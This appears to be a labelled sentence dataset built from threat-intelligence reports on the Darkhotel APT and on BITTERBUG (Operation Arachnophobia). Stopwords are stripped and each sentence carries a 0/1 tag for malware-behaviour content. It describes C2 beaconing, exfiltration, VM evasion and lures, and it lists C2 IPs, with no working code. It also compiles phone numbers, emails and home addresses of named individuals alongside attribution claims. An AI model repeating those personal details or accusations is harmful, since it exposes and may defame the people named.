During infection routine infector changes entrypoint executable files creates .rdat section inserts small loader section puts main payload overlay	1
Every infected file functionality described Trojan­Dropper & Injector section collect information comput- er send C2 download Darkhotel components commanded	1
Observed downloaded components signed familiar expired certificate www.esupplychain.com.tw issued Cybertrust SureServer CA	0
Again technical details provided Appendix D. Almost every backdoor set maintains internal campaign code id used initial c2 communications described	1
Some IDs appear related geographic interests others seem obvious	0
We gathered list Darkhotel campaign IDs shown	0
Internal IDs c2 resources overlap across com- ponents pattern distribution according connectback resources	0
The common id '' DEXT87 '' This infrastructure team appears employ lesser skillset top notch campaigns maintaining weak server configurations limited monitoring defensive reactions making simple mistakes	0
However ef- fective maintaining fully available infrastructure support new existing infections	0
Overall victims sinkhole logs KSN data found across globe majority Japan Taiwan China Russia Korea Hong Kong	0
The following C & C domains sinkholed redirected Kaspersky Sinkhole Server Our Kaspersky Security Network detected Darkhotel infections across thousands machines mostly related Darkhotel p2p campaigns	0
These geolocation estimates probably provide accurate picture Darkhotel activity occurring	0
Here pie chart better visualize proportions attack activity throughout world	0
As see 90 % occurs top five countries Japan followed Taiwan China Russia Korea	0
Because operators actively build new command control serv- ers difficult sinkhole enough domains get accurate overall picture victim system location based data	1
Also many researcher systems connected sinkholed domains	0
However graph current sinkhole callbacks presents low confidence distribution victim geolocation India Japan Ireland Korea China Taiwan top slots	0
Removing India Ireland set closely matches KSN data	0
Many c2s maintain common directory path serves ddrlog	1
The ddrlogs appear maintain callback data attackers want set aside error logs	0
Many callback URLs errors many unwanted IP ranges others clearly unwanted researcher sandbox system callbacks	0
A description detailed connectback URL values xor/base64 encoding scheme included '' Interesting Malware Trojan.Win32.Karba.e '' technical notes Appendix D. The Darkhotel c2 maintain directory structures store serve ddrlog content The following structures appear common across servers pro- duce ddrlog maintain /error/ directory Two ddrlog files report entries starting January 1 2009 9:16 a.m. All logs maintain significant number entries almost 50,000 simple stamp '' B '' '' L ''	1
Those records formatted following manner Only 120 IP addresses perform '' B '' checkin 90 % range 150.70.97.x	0
This entire range owned Trend Micro Tokyo JP	0
A handful remaining addresses like 222.150.70.228 appear come ranges owned Trend Micro JP	0
One outlier comes El Sal- vadoran ISP another connected Japanese ISP	0
Approximately 20,000 IP addresses perform '' L '' checkin	0
Other ddrlogs may include '' A '' tags well	0
The '' A '' tag labels unwanted checkins untargeted locations like Hungary Italy	0
The '' B '' tag labels unwanted checkins Trend Micro IP ranges	0
The '' L '' tag labels unwanted checkins variety ranges includes odd IP like loopback address 127.0.0.1 clearly error	0
Entries logs include callback URLs spaces unusual charac- ters conform required base64 character dictionary	0
Typical main page For begatrendstone.com following directory structure The group encrypts victim data servers single user/passkey combi- nations across multiple victims	1
When unauthorized user attempts access Darkhotel web interface victim management without correct passkey html page table layout renders properly data values page returned garbled ciphertext	0
New victim systems appear systematically vetted	1
The attackers maintain web interface vet new victim systems	1
The attackers first foremost list sort victim systems according latest c2 check­in	1
Collected data probably presented order importance Here example one web pages Clearly automated analysis activity involving researchers ' sandbox tools filling logs	0
From June 2013 April 2014 ( approximately 11 month period ) 15 ddrlog files observe almost 7,000 connections research sandbox systems	0
The network connections provide a1= a3= values identifying QEMU based sandbox sourced 485 WAN IP ad- dresses	0
Under 30 lan IPs recorded 172.16.2.14­126 range	0
This system ( ) uses '' Dave '' user account '' HOME­OFF­D5F0AC '' Windows system name	0
These characteristics correspond network activity generated GFI Soft- ware 's '' CWsandbox '' tools owned '' ThreatTrack Security ''	0
For past seven years strong threat actor named Darkhotel also known Tapaoux carried number successful attacks wide range victims around world	0
It employs methods techniques go well beyond typical cybercriminal behavior	0
The Darkhotel crew 's skillset allows launch interesting cryptographical at- tacks instance factoring 512 bit RSA keys	0
Its use 0-days another indica- tor strong threat actor	0
The targeting top executives various large companies around world stay certain '' Dark Hotels '' one interesting aspects operation	0
The exact method targeting still unknown - instance people targeted others	0
The fact time victims top executives indicates attackers knowledge victims whereabouts including name place stay	0
This paints dark dangerous web unsuspecting travelers easily fall	0
While exact reason hotels function attacker vector unknown certain suspicions ex- ist indicating possibly much larger compromise	0
We still investigating aspect operation publish information future	0
A interesting trait deployment multiple types campaigns targeted botnet	0
This becoming common APT scene targeted attacks used compromise high profile victims botnet style operations used massive surveillance performing tasks launching DDoS attacks hostile parties simply upgrading victims sophisticated espionage tools	1
We expect Darkhotel crew continue activities DIB Govern- ment NGO sectors	0
The appendix released paper provides technical indicators compromise help victims identify malicious traffic enable targets protect better attack	0
Cyber Squared Inc. 's ThreatConnect Intelligence Research Team ( TCIRT ) tracks number threat groups around world	0
Beginning summer 2013 TCIRT identified suspected Pakistani-origin threat group	0
This group revealed TCIRT publicly August 2013	0
In months following disclosure identified new activity	0
Cyber Squared partnered experts FireEye Labs examine new observations attempt discover new research insight group Operation '' Arachnophobia ''	0
The following report product collaborative research threat intelligence sharing Cyber Squared Inc. 's TCIRT FireEye Labs	0
• While conclusively attributing BITTERBUG activity Tranchulas specific Pakistani entity confidently point many characteristics Pakistan-based cyber exploitation effort probably directed Indian targets and/or involved India-Pakistan issues	0
• The threat actors utilized hosting provider Pakistani-based company subleased VPS space within U.S. command control ( C2 )	1
• The customized malware ( BITTERBUG ) used threat actors observed hosted communicating two IP addresses operated Pakistan-based hosting provider	1
• Early variants BITTERBUG malware build paths containing strings '' Tranchulas '' '' umairaziz27 ''	0
Tranchulas name Pakistani security firm ; Umair Aziz name Tranchulas employee	0
• Following release blog post highlighting activity malware 's build strings threat actors appear modified binary file paths make generic	0
• Employees Pakistan-based hosting provider Tranchulas appear within others ' social networks	0
On August 2 2013 TCIRT published blog '' Where There Smoke There Fire South Asian Cyber Espionage Heats Up '' TCIRT identified custom malware later dubbed BITTERBUG FireEye suspected linked Pakistani-based exploitation activity directed Indian entities	0
We found debug path references '' Tranchulas '' also name Pakistani security company	0
Tranchulas claims support '' national level cyber security programs '' development offensive defensive cyber capabilities	0
At time incident seemed isolated one TCIRT beginning	0
Our suspicions Tranchulas ' involvement activity began mount based series events occurred release blog post	0
During past year communicated Tranchulas Pakistan-based hosting provider	0
Suspicious responses oddly similar replies received companies inquiries well anomalies email headers prompted us research companies	0
Our research revealed • The C2 hosting provider ( VPSNOC ) likely conducting business operations within Pakistan subleasing infrastructure U.S. providers	0
• VPNSOC Tranchulas employees maintained type undefined relationship given connections via social media	0
• Both organizations employed affiliated personnel offensive cyber expertise	0
• When TCIRT initially contacted Tranchulas following original blog post denied involvement activity	0
Tranchulas maintained framed already aware activity prior blog post contact	0
However inconsistencies claims responses made scenario questionable	0
TCIRT began tracking set activity involving BITTERBUG variant May 2013	0
To knowledge customized malware ever observed hosted communicating two command control nodes 199.91.173.43 199.91.173.45	1
According Whois records IP addresses registered web-hosting firm Kansas City Missouri	0
Based public records organization appears legal entity chartered conduct business Missouri	0
On July 24 2013 TCIRT contacted Kansas City-based hosting provider notify malicious activities emanating IP address 199.91.173.43	0
The hosting provider subsequently introduced TCIRT client VPNSOC customer responsible subleasing IP address	0
Later day TCIRT received response support @ vpsnoc.com providing limited information server related traffic ( Figure 2 )	0
When TCIRT sent follow-up communications VPSNOC respond increasing suspicions	0
While reviewing metadata VPSNOC 's July 24 2013 email response noticed email sent +0500 time zone	0
This time zone usage consistent Pakistan 's time zone	0
The TCIRT published details initial activity aforementioned blog post August 2 2013	0
Four days later August 2013 Tranchulas Chief Executive Officer Zubair Khan contacted us regarding blog post subsequent press coverage	0
Khan submitted '' ResponseThreatConnect.docx '' explanation observed activity media TCIRT indicating debug paths using '' Tranchulas '' '' umairaziz27 '' '' done developer malware portray wrong impression Tranchulas mislead malware analysts ''	0
Notably Khan included screenshot email message	0
The message reportedly response VPSNOC email message Tranchulas sent July 21 2013 purportedly notify VPSNOC malicious activity identified TCIRT	0
However noted certain anomalies message	0
As seen Figure 3 '' email message '' '' sent '' VPSNOC unidentified tranchulas.com email address '' Tue Jul 21 2013 11:36 PM	0
'' July 21 2013 Tuesday fact Sunday	0
The mismatched date suggests email message potentially modified order support claim Tranchulas aware already reported exploitation activity	0
TCIRT speculates '' Tuesday '' hastily chosen official notification VPSNOC sent Wednesday 24th	0
In addition '' response '' received Tranchulas nearly identical received TCIRT	0
We believe Tranchulas may obtained information TCIRT 's notification VPSNOC pre-established relationship	0
The TCIRT responded Mr. Khan 's official explanation follow-up inquiry offering Khan opportunity explain notable date inconsistency within email screenshot	0
The TCIRT also requested Mr. Khan share actual email message original attached headers	0
Mr. Khan address TCIRT question rather deferred request Mr. Hamza Qamar Penetration Testing Team Lead Tranchulas	0
On August 15 2013 three days later Qamar responded TCIRT brief denial modifications screenshot ( email address anonymization ) specifically referred TCIRT back VPSNOC support ( support @ vpsnoc.com ) follow questions	0
Astonished dismissal deflection TCIRT immediately began explore relationship VPSNOC Tranchulas	0
During research VPSNOC identified actually based conducts partial operations within Pakistan	0
The company gives impression operating Kansas City marketing use leased IP space ( Figure 4 )	0
The Whois records vpsnoc.com revealed domain registered Digital Linx Hosting	0
Digital Linx also Pakistan-based hosting company ( Figure 5 )	0
As seen Figure 6 administrative email address admin @ digitallinx.org	0
This registrant record digitallinx.net domain	0
The domains digitillinx.org digitallinx.net digitallinx.com share current historical similarities WHOIS records sitemap.xml files imply controlled individual entity	0
The domain digitallinx.com registered Muhammad Naseer Bhatti ( Digital Linx Founder ) uses email addresses naseer @ digitallinx.com nbhatti @ gmail.com	0
The domain also registered address 638-F Johar Town Lahore Pakistan	0
The contact telephone number listed Digital Linx ' web site 925-665-1427 ( Figure 6 ) also used WHOIS record defiantmarketing.com	0
The domain defiantmarketing.com registered Abunasar Khan	0
The registration lists VPSNOC registrant organization abunasar @ yahoo.com registration email address House 12 Street 21 F-8/1 Islamabad Federal 44000 registration address	0
Abunasar Khan observed using aliases '' agnosticon '' '' agnostic ''	0
From able locate advertisement Blackhatworld forum April 2012 posted agnosticon promoting VPSNOC identifying subdivision Digital Linx Hosting ( Figure 7 )	0
Though none information surprising suggests Bhatti Abunasar Khan work worked Digital Linx VPSNOC time located Pakistan	0
Additional research Abunasar Khan identified several registered domains fragments online presence	0
Based websites account information appears interest participated Antisec Anonymous movements ( Figure 8 )	0
He also used '' anony mo us '' registration name field personal account	0
In addition Abunasar Khan 's Google+ profile revealed connections least one Tranchulas employee Hamza Qamar Digital Linx employee Shoaib Riaz	0
Hamza Qamar Team Lead Penetration Testing Tranchulas TCIRT last spoke	0
Visiting Hamza Qamar 's Google+ page ( Figure 9 ) directly connected person Abunasar Khan	0
At point shows probable VPNSOC employee ties interests hacking undefined potentially close relationship Hamza Qamar Penetration Testing employee Tranchulas	0
Qamar indicated public LinkedIn profile '' engaged system enterprise level network Web application security testing clients ranging large federal agencies DoD commercial clients '' though unclear '' DoD '' referenced ( e.g. whether Pakistani Ministry Defense nation 's defense department )	0
Tranchulas identifies government ( presumably Pakistan 's government ) operational sector work	0
Tranchulas ' offensive cyber initiative services offered '' national-level cyber security programs '' indicating commercial demand '' national-level '' customers	0
Though Tranchulas brands multi-national company respective addresses within United Kingdom United States New Zealand	0
We found evidence addresses associated either virtual office spaces address forwarding services	0
For background information personas please see Appendix F Personas	0
The following summary relationships hosting organizations Tranchulas • VPNSOC IP space used command control nodes attackers using variants BITTERBUG malware contained build strings referenced '' Tranchulas '' Tranchulas employee	1
• Tranchulas VPNSOC direct communication point July-August 2013	0
• VPNSOC subsidiary Digital Linx	0
• Tranchulas VPNSOC Digital Linx physically located Pakistan maintained virtual presence within U.S. • Hamza Qamar employee Tranchulas	0
• Muhammad Naseer Bhatti self-proclaimed founder Digital Linx	0
• Abunasar Khan affiliated AntiSec VPNSOC	0
• Digital Linx founder Muhammad Naseer Bhatti least working relationship VPNSOC employee Abunasar Khan – connected domain registrations common Google+ profile Shoaib Riaz ( another Digital Linx employee )	0
• VPNSOC employee Abunasar Khan direct connection Tranchulas employee Hamza Qamar Google+	0
Note A walkthrough research available Appendices C D E. Metadata Analysis As mentioned earlier email exchanged Zubair Khan sent TCIRT Microsoft Word document ( .docx	0
)	0
In reviewing document metadata '' ResponseThreatConnect.docx '' TCIRT identified contained creator properties '' hp	0
'' TCIRT compared metadata two benign BITTERBUG-associated decoy documents July 2013 found also author '' hp '' ( Figure 10 )	0
While author field '' hp '' n't conclusively prove relationship contributes body circumstantial evidence links properties official Tranchulas response properties decoy documents used conjunction BITTERBUG targeting campaigns	1
CyberSquared Inc. partnered FireEye second technical review malware associated activity	0
FireEye analyzed malware call BITTERBUG determined custom backdoor	1
The backdoor relies various support components including non-malicious publically available Libcurl installation launch communications	1
In variants BITTERBUG ability automatically target exfiltrate files extensions .doc .xls .pdf .ppt .egm .xml	1
	0
The full malware report included Appendix A Malware Details	0
The earliest evidence malware family dates April 2013 based Portable Executable ( PE ) compile times 10 BITTERBUG variants observed date	0
The earliest samples BITTERBUG contain '' Tranchulas '' debug path ( ) mentioned August 2013 TCIRT blog post	0
These BITTERBUG variants probably used attacks around summer 2013 using possible lures related then-recent death '' Sarabjit Singh '' ( Indian national imprisoned Pakistan ) Indian Government pension memorandum	0
As stated original blog ( raised formal Tranchulas response ) several binaries contain references '' Cath '' debug path	0
It important note '' Cath '' files support components BITTERBUG variants probable developed another party required component family	0
Additional BITTERBUG variants compiled June July 2013 contained different identifiers debug paths '' Cert-India '' ( 3 samples ) '' umairaziz27 '' ( 1 sample )	0
The presence '' umairaziz27 '' debug path one sample makes us wonder represents operational security mistake	0
The debug path '' umairaziz27 '' led us Twitter LinkedIn accounts ( matching alias used ) belong Tranchulas employee named Umair Aziz identified Information Security Analyst graduate National University Sciences Technology ( NUST )	0
One samples probably used attacks late summer 2013 using '' leaked report '' lure contained decoy document related Pakistan 's alleged inability locate Osama Bin Laden	1
After publication TCIRT blog communications Tranchulas occurred August 2013 new samples BITTERBUG support components ( based compile times ) identified September ( various support components ) October ( new BITTERBUG variant )	0
Interestingly samples compiled following blog publication used entirely new generic debug paths ( Figure 11 ) well compilation tactic conceal C2 address static analysis	1
Between September December observed variations BITTERBUG support components terms packaging host-based activities decoys ( lack ) compared samples blog post	0
This could indicate threat actors aware blog post modified malware related components distance prior indicators	0
Between December 2013 late March 2014 observed several new lures used BITTERBUG self-extracting RAR ( SFXRAR ) files	1
One December contained several BITTERBUG variants used decoy PDF document ( Figure 12 ) related December arrest Devyani Khobragade Indian diplomat United States	1
In spring 2014 observed SFXRAR file filename lure related March 2014 disappearance Malaysis Airlines Flight 370 ( cast Pakistan-related hijacking )	1
This SFXRAR contained latest BITTERBUG variant new dependencies support components	0
Interestingly SFXRAR 's filename lure element related MH370 event ; contain decoy document	1
We provide detailed report SFX related variant Appendix A Malware Details	0
BITTERBUG continued rely network behaviors communicate C2s	1
Connections C2 nodes relied PHP used communications included '' .php ? compname= '' '' .php ? srs= '' well direct file/component retrieval C2s	1
Though many samples observed use direct IPs HTTP communications observed limited use No-IP domain	1
Operation Arachnophobia consists apparent targeted exploitation campaign dating back early 2013 using BITTERBUG malware family seemingly directed entities involved India-Pakistan issues	0
The threat actor appears exclusively used VPSNOC probable Pakistan-based VPS service provider leased U.S. hosting services delivery C2 phases attack	1
Research later identified Pakistan-based VPSNOC representative social network affiliation Tranchulas employee well apparent affiliations Anonymous AntiSec movements	0
After August 6 2013 blog Tranchulas provided TCIRT media official statement explanation BITTERBUG activity however explanation contained discrepancies	0
The TCIRT addressed discrepancies Tranchulas personnel unresponsive increasing suspicion activity	0
We later observed BITTERBUG activity following August 2013 subtle changes generalized debug paths	0
It chain events served catalyst extra scrutiny activity collaboration ThreatConnect FireEye Labs teams share information	0
While conclusively attributing BITTERBUG activity Tranchulas specific Pakistani entity confidently point many characteristics Pakistan-based cyber exploitation effort probably directed Indian targets involved India-Pakistan issues	0
Many notable characteristics BITTERBUG activity suggest indeed part Pakistan-based cyber exploitation effort apparently attempted obfuscate malware characteristics origins ( behind U.S. infrastructure ) public disclosure August 2013	1
On surface BITTERBUG serves example threat actors mask operations across social cultural geographic boundaries	0
More importantly demonstrates value threat intelligence sharing industry collaboration	0
As one organization begins pull thread evidence share findings another larger understanding shared perspective revealed	0
It process shared awareness emerges larger comprehensive story explains seeing - ultimately story better serves us	0
BITTERBUG backdoor executable capable uploading downloading files listing running processes generating file listings automatically transferring selected files command control ( C2 ) server	1
BITTERBUG appears virtual machine aware may execute VMWare VirtualBox VM	1
We observed BITTERBUG installed self-extracting RAR archive disguised screensaver	1
Upon execution self-extracting RAR archive may extract configuration files dependency DLLs BITTERBUG executable	1
The timeline BITTERBUG activity May 2013 March 2014	0
Upon execution self-extracting RAR may install BITTERBUG .exe following DLLs The self-extracting RAR may install following benign configuration files BITTERBUG first may execute following Windows Management Instrumentation ( WMI ) command detect presence virtual machine ( VM ) BITTERBUG may open recovery.txt check presence strings VBox VMware	1
The backdoor may enter infinite sleep loop recovery.txt contains either one aforementioned strings ( Example Figure 13 )	1
Next BITTERBUG typically beacon C2 server sending computer name username compromised system	1
An example beacon request shown Figure 14	0
BITTERBUG may perform HTTP GET request following URI If C2 server responds filename filename received deleted % APPDATA % \Microsoft FILENAMEFROM C2	1
The purpose command might delete older versions BITTERBUG although observed command occurring wild	1
BITTERBUG may attempt download files listed Table 1	1
The purpose first three files unknown	0
The final two files downloaded user 's Startup directory executed startup order maintain persistence	1
Next BITTERBUG may scan drive letter search recursively files following file extensions BITTERBUG typically creates file list containing documents ( excluding whose filename contains MediaUtils ) following locations BITTERBUG may also write list running processes Finally BITTERBUG typically uploads running process list document file list documents following URI BITTERBUG may extracted along following embedded files The malware may create following files • The malware typically communicates TCP port 80 • The malware may perform HTTP requests following URIs We observed interesting operational security-oriented challenges post-blog post samples	1
In one case actor appeared manually null '' Cert-India '' user directory one file paths ( see figures 15 16 ) contained two binaries ( support components )	0
These files shared import hash ( 4e96e86db5a8a025b996aefdc218ff74 ) virtually files minus modification bytes second sample	0
As samples point also observed use C++ Boost libraries introduced new file path monitor operational security purposes	0
We observed least one case files mixed old new file paths seen figures 17 18	0
In cases possible actors intentionally attempt mislead research efforts post-blog samples cast suspicion '' Cert-India '' more-revealing element	0
For example analysis files deployed alongside nulled-out '' Cert-India '' sample mentioned revealed lack concern string	0
Alternatively inconsistencies could also indicate sloppy tradecraft and/or teamwork	0
BITTERBUG Hashes BITTERBUG Support Component Debug Strings ( order first use ) BITTERBUG Import Hashes HTTP Requests BITTERBUG Domain & IPs The Kansas-City-based hosting provider sent introductory email message July 24th 2013 1500 CDT would received TCIRT 1400 EDT VPSNOC Thursday July 25th 2013 1200 PKT	0
Analysis VPSNOC email header indicated message sent Thursday 25 July 02:28:41 +0500 GMT consistent Pakistan 's time zone	0
Of note email message sent X-Originating IP Address 184.75.214.10 corresponding Private Internet Access Canadian proxy	0
VPSNOC 's use commercial proxy service likely demonstrates intent mask apparent origin sender	0
These two examples highlight VPSNOC 's inbound outbound email communications consistently utilized +0500 Pakistani timezone	0
Due apparent Pakistani nexus within BITTERBUG malware Pakistan time zone consistently observed within VPSNOC emails TCIRT applied additional scrutiny research content within Tranchulas '' Response ThreatConnect.docx '' validate claims	0
In following section examine inconsistencies observed	0
Within response observed following inconsistencies Our review '' ResponseThreatConnect.docx '' focused email screenshot ( Figure 3 ) image1.png Khan provided revealing date probably modified appear though first notify VPSNOC	0
Within official response Zubair Khan indicated Tranchulas '' already aware incident ...	0
contacted hosting company	0
'' The official response included screenshot depicting email sent VPSNOC unidentified ( redacted ) tranchulas.com email address sent '' Tue Jul 21 2013 11:36 PM '' evidence date received responded VPSNOC	0
This message contained notable misalignment date day week	0
July 21 2013 Sunday Tuesday	0
'' Tuesday '' would pre-dated official notification occurred Wednesday July 24 2013 could indicate Tranchulas may obtained insight original TCIRT notification Pakistan- based contacts within VPSNOC	0
The TCIRT subsequently responded Mr. Khan 's official explanation follow-up inquiry offering Khan opportunity explain date inconsistency within email screenshot	0
Mr. Khan deferred request Mr. Hamza Qamar Penetration Testing Team Lead Tranchulas later responded simple denial email message altered apart blurring name original sender	0
The email screenshot ( image1.png ) within Tranchulas response demonstrated awareness information initially withheld later released blog post one malware variant contained debug string '' umairaziz27 '' username Tranchulas employee	0
The Tranchulas message VPSNOC incorrectly claimed identify malware 199.91.173.43 contained '' company 's name ...	0
employee 's name ''	0
While possible Tranchulas ' analysts discovered variant independent blog post added inconsistent elements response suggested blog post may inspired communications VPSNOC	0
We note requested additional information '' detailed analysis report '' within exchange Tranchulas receive response	0
The Tranchulas response indicates '' Tranchulas ' research team already aware incident publication report	0
Our team contacted hosting company server seek explanation	0
'' Considering public references identified infrastructure identifying VPSNOC '' hosting company ''	0
The way Tranchulas identify VPSNOC hosting company either previous insider knowledge activity privately introduced Kansas-City-based service provider '' client '' VPSNOC never mentioned discussed initially exchanged either Kansas-City Pakistan-based hosting providers	0
Public registration 199.91.173.43 reveals Kansas-City-based hosting provider official registrant owner infrastructure	0
The way know VPSNOC subleasing infrastructure obtain information directly	0
There public reference would revealed VPSNOC entity maintained root access 199.91.173.43	0
Had Tranchulas legitimately conducted initial victim notification sometime late July 2013 would likely done Kansas-City-based hosting provider VPSNOC	0
On August 15 2013 Hamza Qamar 's response TCIRT 's follow inquiry observed inconsistencies redirected TCIRT personnel VPSNOC obtain explanation versus attempting explain observed day date inconsistency document properties within Tranchulas email	0
The TCIRT 's suspicion mounted presenting Tranchulas opportunity set record straight Tranchulas could substantiate claims rather deferring TCIRT inquiry third party ( VPSNOC )	0
Within '' ResponseThreatConnect.docx '' image '' image1.png '' contains undated response VPSNOC '' Tue Jul 21 2013 '' Tranchulas notification	0
The undated VPSNOC response Tranchulas received nearly identical response TCIRT Kansas-City-based service provider obtained July 24th	0
Tranchulas include date time obtained response VPSNOC	0
The TCIRT found unusual neither Kansas-City-based service provider VPSNOC personnel ever indicated either way knew activity previously contacted either party	0
When considering inconsistencies order events studying Gmail webmail layout similarities keywords salutations closings within '' Tue Jul 21 2013 '' Tranchulas notification respective VPSNOC response	0
The TCIRT grew increasingly suspicious exchanges VPSNOC subsequent exchanges Tranchulas personnel	0
Analysis metadata within two benign decoy documents originally used within July 2013 BITTERBUG operations Report.docx NaxalitesFundedbyPakistan.docx maintained author properties '' hp ''	1
In reviewing document metadata within '' ResponseThreatConnect.docx '' sent Mr. Zubair Khan August 6 2013 TCIRT also identified document maintained creator properties '' hp	0
'' ( Figure 10 ) While author field '' hp '' n't conclusively prove relationship contributes body circumstantial evidence matches document properties official Tranchulas response document properties also found within decoy documents bundled BITTERBUG implants	0
According vpsnoc.com website '' In 2007 five VPS experts decided invest private rack space heart Kansas United States	0
Their aim ? To bring service-oriented quality managed unmanaged VPS solutions clients world	0
Just 1 year later beginning enterprise 3 servers filled 2 server racks happy clients receiving quality U.S support	0
Their company continued build momentum	0
'' Whois records vpsnoc.com indicate another individual registered domain listed Digital Linx Hosting registrant organization Kansas City-based address telephone number 925-665-1427 administrative email address admin @ digitallinx	0
org	0
This registrant record digitallinx.net domain	0
The digitallinx.net/sitemap.xml corresponding Google cache digitallinx.net/sitemap.xml indiciate digitallinx.net digitallinx.com shared sitemap.xml time	0
The digitallinx.net/Contact.html identified similar overlaps data across .org	0
.net	0
.com	0
domains	0
The domain digitallinx.com registered Perasona # 1	0
He uses email addresses naseer @ digitallinx.com nbhatti @ gmail.com domain registrant email address along address 638-F Johar Town Lahore Pakistan telephone 966.548805579	0
The DigitalLinx ( digitallinx.com ) website states '' web hosting / Web Solutions & Processing Outsourcing Company based Pakistan ''	0
Open source research phone number 925-665-1427 indicates also used within site content phone number defiantmarketing.com	0
This domain registered Persona # 2 uses aliases '' agnosticon '' '' agnostic ''	0
Persona # 2 lists VPSNOC registrant organization uses registration email address abunasar @ yahoo.com address House 12 Street 21 F-8/1 Islamabad Federal 44000	0
The domain defiantmarketing.com domain used ns1.abunasar.net ns2.abunasar.net name services	0
Within January 2009 posting Debian users forum Persona # 2 sends email abunasar @ yahoo.com reply-to abunasar @ army.com	0
Within post Persona # 2 responds question '' Who 's using Debian '' listing DigitalLinx Kansas City MO link digitallinx.com	0
Also seemingly abandoned Twitter profile Persona # 2 following Twitter profile @ VPSNOC	0
In April 2012 post blackhatworld.com user alias '' agnosticon '' posted promotional codes VPSNOC hosting services engaging customers providing feedback regarding VPS services thanking positive reviews	0
Within posting user '' agnosticon '' included image actual advertisement hosted http //vpsnoc	0
com/order.png	0
Within posted image states '' VPSNOC subdivision Digital Linx Hosting	0
We business since 2008 ''	0
The posting concludes '' If questions/queries please contact us directly support @ vpsnoc.com '' Muhammad Naseer Bhatti 's LinkedIn profile indicates currently founder Digital Linx LLC vBilling ( vbilling.org ) well consultant U.S. company	0
Both Bhatti Digital Linx listed registrants vbilling.org v-billing	0
com vgriffins.com my-server.co use P.O	0
Box 295658 Riyadh Saudi Arabia registration address	0
This also address two U.S. companies ' local operations	0
Bhatti also listed owner netblock 46.4.139.224/28	0
Both passive DNS sources well Robtex highlight overlapping infrastructure	0
From September 7 - 9 2011 Tranchulas cooperation Pakistan National University Sciences Technology ( NUST ) offered Certified Penetration Testing Profession ( CPTP ) Workshop ( Figure 17 )	0
During workshop basic penetration techniques skills presented	0
It likely CPTP workshops alignment NUST allowed Tranchulas opportunity recruit student interns	0
Within CPTP event registration contact information Muhammad Naseer listed next Tranchulas office number ( 051- 2871433 )	0
It important note Muhammad Naseer Bhatti previously known drop family name '' Bhatti '' within online correspondence ( Figure 18 )	0
In June 2012 episode Engineering Technology Magazine podcast Mohammed Nasser Penetration Tester Tranchulas interviewed	0
A Mohammed Nasser may also directly affiliated Tranchulas	0
This links Tranchulas Pakistani employee consultant also named Muhammad Naseer	0
It unknown Muhammad Naseer associated VPSNOC 's parent company Digital Linx Pakistan-based service provider hosted original BITTERBUG malware	0
Abunasar Khan also maintains aliases '' agnosticon '' '' agnostic '' addition email addresses abunasar @ yahoo	0
com abunasar @ army.com	0
He previously associatedwith VPSNOC & Digital Linx	0
An April 2012 Whois registrant record domain zeusadnetwork.com includes first last name Khan along ( 925 ) 665-1427 phone number seen within Digial Linx Hosting domains	0
Khan registered variety domains many use abunasar.net name services abunasar.yahoo.com within Start Authority ( SOA ) records	0
For example July 2014 record ( Figure 19 ) defiantmarketing.com August 2013 record ( Figure 20 ) ns2.vpsnoc.com maintain references	0
Abunasar Khan registered abunasar.net previously ( May 2007 ) maintained whitehate.org used demonstrate affinity alignment AntiSec Anonymous movements	0
The abunasar.net website prominently displays ascii art term '' antisec '' antisec related content '' Blend	0
Get trusted	0
Trust nobody	0
Own everybody	0
Disclose nothing	0
Destroy everything	0
Take back scene	0
'' This shared affinity also reflected amongst culture Tranchulas employees	0
The pure.whitehate.org domain also previously associated Khan examples found within # phrack # darknet IRC sessions	0
Ironically February 2011 Khan 's Rootkit.com user profile compromised revealing profile 's username password hash email ( abunasar @ army.com ) registration IP address 202.125.143.67 ( Islamabad Pakistan )	0
During registration Khan specified name '' anony mo us '' registering profile	0
As 16 August 2013 Pastebin post contained details customer database compromise nowclothing.pk included Khan 's name email abunasar @ army.com cell phone number 03215488881	0
Research 03215488881 cell phone number yields user profile '' abunasark '' April 2009 posting	0
Khan posts pictures blue Baleno includes another phone number 03234764838	0
In secondary profile user '' Ak '' uses cell phone number 03215488881 2009 sales posting 2004 blue Baleno	0
Khan 's affinity Suzuki Baleno cars made obvious May 2009 registration clubaleno.co.uk registered Khan VPSNOC using name services ns1.abunasar.net ns2.abunasar.net SOA record abunasar.yahoo.com	0
Later June 2009 posting Khan using alias '' agnostic '' attempts sell domain clubaleno.co.uk uses abunasar @ army.com email address point contact	0
Khan also observed using alias '' agnosticon '' Toyota Racing Development avitar within posts blackhatworld.com within 2011 post posts cpanel error also includes '' abunasar '' username within system output	0
The Google+ profile Khan reveals established social network links Team Lead Penetration Testing Tranchulas Digital Linx employee Shoaib Riaz also maintains social network association Digital Linx founder Muhammad Nasser Bhatti	0
The Tranchulas website states provide range security services training include penetration offensive cyber initiative ( OCI ) '' help national level cyber security programs strategies managing offensive technical threats ''	0
In September 2011 YouTube user '' tranchulascert '' posted video titled '' Tranchulas Cyber Ranges - P @ sha ICT Awards 2011 '' awarded runner	0
Within video cyber ranges referenced developed '' defense forces '' aimed '' help developing offensive defensive warfare skills '' '' combating anti-state hackers ''	0
Although Tranchulas brands multi-national company respective operating addresses within United Kingdom United States New Zealand associated either virtual office spaces address forwarding services	0
The Tranchulas website lists Pakistan address within 2nd floor Evacuee Trust Complex Sir Agha Khan Road F-5/1 Islamabad 44000	0
The Evacuee Trust Complex also known Software Technology Park 2 STP2 hosts variety commercial government offices	0
The Tranchulas employee Hamza Qamar handled response inquiry public LinkedIn profile states '' Engaged system enterprise level network Web application security testing clients ranging large federal agencies DoD commercial clients	0
'' The profile specify DoD reference U.S. Department Defense another country 's Ministry Defense	0
Interestingly Qamar 's Google+ page showed one '' friend '' circle despite 40 followers Abunasar Khan VPSNOC employee	0
It likely Tranchulas provides services Pakistani government	0
The offensive cyber initiative services offered Tranchulas offered '' national-level cyber security programs '' suggesting commercial demand '' national-level '' customers	0
The stated purpose intent Tranchulas '' Cyber Ranges '' P @ sha ICT 2011 awards video suggests ranges specifically developed support national interests offensive defensive purposes	0
The domain registration Zubair Khan using official Pakistani government address zubair @ tranchulas.com email address indicates Khan may currently maintains physical address location Pakistani government officials reside	0
Historic Whois registration records domains textcrypter.com taggnation.com bookadoconline.com saadiakhan	0
net lists Tranchulas CEO Zubair Khan ( zubair @ tranchulas.com ) registrant domains	0
At time registration Khan used address 15-B Mehran Block Gulshan-e-Jinnah F-5/1 Islamabad Pakistan domains	0
In April 2008 Request Proposals Pakistan Public Works Department issued tender Constriction Government Servant Quarters Garages Gulshan-e-Jinnah Complex F-5/1 Islamabad	0
